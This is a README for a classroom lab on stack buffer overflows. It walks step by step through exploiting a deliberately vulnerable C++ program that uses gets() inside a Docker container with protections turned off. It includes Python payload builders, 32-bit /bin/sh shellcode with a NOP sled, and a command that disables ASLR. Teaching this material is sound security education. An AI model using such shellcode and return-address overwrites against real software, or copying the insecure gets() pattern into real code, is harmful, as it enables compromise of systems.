# Objective
# 🛡️ Teaching Buffer Overflow in C++

# 👨‍🏫 **Objective**: Understand how unsafe input functions in C/C++ can be exploited to alter program flow.

# Install 
## Clone the Repository 
```
git clone git@github.com:gtoscano/buffer-overflow.git
cd buffer-overflow
docker build -t buffer-overflow .
docker run -it buffer-overflow
```



---

## 🧠 What You’re About to Do

We'll exploit a simple C++ program that:

1. Uses `gets()` (unsafe)
2. Has a 64-byte buffer on the stack
3. Fails to check input size

👾 **Goal**: Redirect execution to a hidden `secret()` function.

---

## Diagram of Stack and Overflow
```
EBP = Extended Base Pointer
FP = Frame Pointer
RA = Return Address

                  +---------------------------+
                  |  higher stack frames     |  (previous function contexts)
                  +---------------------------+
                  |  saved EBP (old FP)      | <-- saved frame pointer for vulnerable()
                  +---------------------------+
(legit RA) ---->  |  return address for      | <-- normally points back to main()
                  |  vulnerable()            |
                  +---------------------------+
                  |                         |  
  buffer start -->|  buffer[0]              |  
                  |  buffer[1]              |  
                  |  buffer[2]              |  
                  |       ...               |  64 bytes allocated
                  |  buffer[63]             |  
  buffer end ---->|                         |
                  +---------------------------+
                  |  (possible padding)      | <-- not always present, but can exist
                  +---------------------------+
(overflow data) ->|  overwritten EBP         | <-- overwritten by out-of-bounds write
                  +---------------------------+
(overflow data) ->|  new return address      | <-- attacker-supplied address of secret()
                  +---------------------------+
                  |  rest of the stack...    |
                  +---------------------------+
```

## 🧪 The Vulnerable Code

```cpp
#include <iostream>
#include <cstdio>
#include <cstdlib>

void secret() {
    std::cout << "Access granted to secret!\n";
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    std::cout << "Enter text: ";
    gets(buffer);  // 💣 buffer overflow possible here!
}

int main() {
    vulnerable();
    return 0;
}
```

---

## 🐳 Set Up the Environment

```dockerfile
FROM ubuntu:12.04

RUN sed -i 's|archive.ubuntu.com|old-releases.ubuntu.com|g' /etc/apt/sources.list && \
    apt-get update && apt-get install -y build-essential gdb && apt-get clean

COPY vuln.cpp /vuln.cpp
RUN g++ -fno-stack-protector -z execstack vuln.cpp -o vuln
CMD ["/bin/bash"]
```

---

## 🔍 Step 1: Find `secret()` Address

Run:

```bash
gdb ./vuln
```

Then in `gdb`:

```gdb
info functions secret
```

Example output:

```
0x080484b6  secret()
```

---

## 🧮 Step 2: Calculate Overflow

Stack layout in `vulnerable()`:

```
[ buffer (64 bytes) ]
[ saved EBP (4 bytes) ]
[ return address (4 bytes) ] 👈 we overwrite this
```

➡️ Total: **68 bytes padding** + 4 bytes address

---

## 💥 Step 3: Craft the Payload

Assuming `secret()` is at `0x08048674`:

```bash
python -c 'print "A"*76 + "\x74\x86\x04\x08"' > payload
```
or:

```bash
for i in $(seq 60 78); do
  echo "Trying offset: $i"
  python -c "print 'A'*$i + '\x74\x86\x04\x08'" > payload
  ./vuln < payload && echo "Success at offset $i!"
done
```

### ✅ More Stable `ret2secret` Payload (Recommended)

If you see `Illegal instruction`, `Segmentation fault`, or `Floating point exception` *after* your
success message, the overwrite likely worked, but `secret()` returned to an invalid address.

Use a second return address after `secret()`.

```bash
gdb ./vuln
```

In `gdb`:

```gdb
disassemble main
```

Example:

```text
0x0804870c <+6>:  call   0x80486ac <vulnerable>
0x08048711 <+11>: mov    $0x0,%eax
```

Use the instruction immediately after `call vulnerable` as `after` (here: `0x08048711`).

Then build:

```bash
python - <<'PY'
import struct
secret = 0x08048674   # from gdb: p/x secret
after  = 0x08048711   # from gdb: next instruction after call vulnerable
payload = b"A"*76 + struct.pack("<I", secret) + struct.pack("<I", after)
open("payload_ret2secret", "wb").write(payload)
print("Wrote payload_ret2secret")
PY
```

Run:

```bash
./vuln < payload_ret2secret
```

This usually preserves control flow better than a single overwritten return address.


Run the attack:

```bash
./vuln < payload
```

💡 For this lab, success means execution is redirected into `secret()`.  
Getting an interactive shell depends on environment details and may still crash afterward.

---

## 🧬 Step 4: Alternate Payload Example (Shellcode)

If you want a second exploit pattern, you can place shellcode in the input and overwrite the return
address so execution jumps back into the buffer.

Example 32-bit Linux shellcode (`/bin/sh`) bytes:

```bash
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

Example payload builder (replace `RET_ADDR` with your little-endian stack/buffer address):

```bash
python - <<'PY'
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
buf_to_ret = 76
nop_sled = b"\x90" * 24
# RET_ADDR
# gdb ./vuln
# break vulnerable
# run
#print &buffer
#(gdb) print &buffer
# $1 = (char (*)[64]) 0xff914960
# If little-endian use: b"\x60\x49\x91\xff"   
ret_addr = b"\x60\x49\x91\xff"  
body = nop_sled + shellcode
if len(body) > buf_to_ret:
    raise SystemExit("Shellcode + NOP sled too large for current offset")
payload = body + b"A" * (buf_to_ret - len(body)) + ret_addr
open("payload_shellcode", "wb").write(payload)
print("Wrote payload_shellcode")
PY
```

Run:

```bash
./vuln < payload_shellcode
```

Note: this only works reliably in the lab setup (e.g., `-z execstack`, ASLR off, and correct return address).
If you see unstable behavior across runs, verify ASLR is actually disabled in your environment.

---

## 🚧 Disable ASLR (for predictability)

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

This ensures addresses like `0x08048674` are stable.

---

## 🧠 Learning Takeaways

✅ Stack layout  
✅ Unsafe input = security risk  
✅ Return address hijack  
✅ Importance of memory-safe coding

---

## 🙏 Use Responsibly

- **For educational purposes only**
- Never exploit systems without permission
- Use modern practices: `fgets`, stack canaries, ASLR, PIE, etc.

---

# 🎓 Thank You!

Questions?  
Let's explore secure coding together!
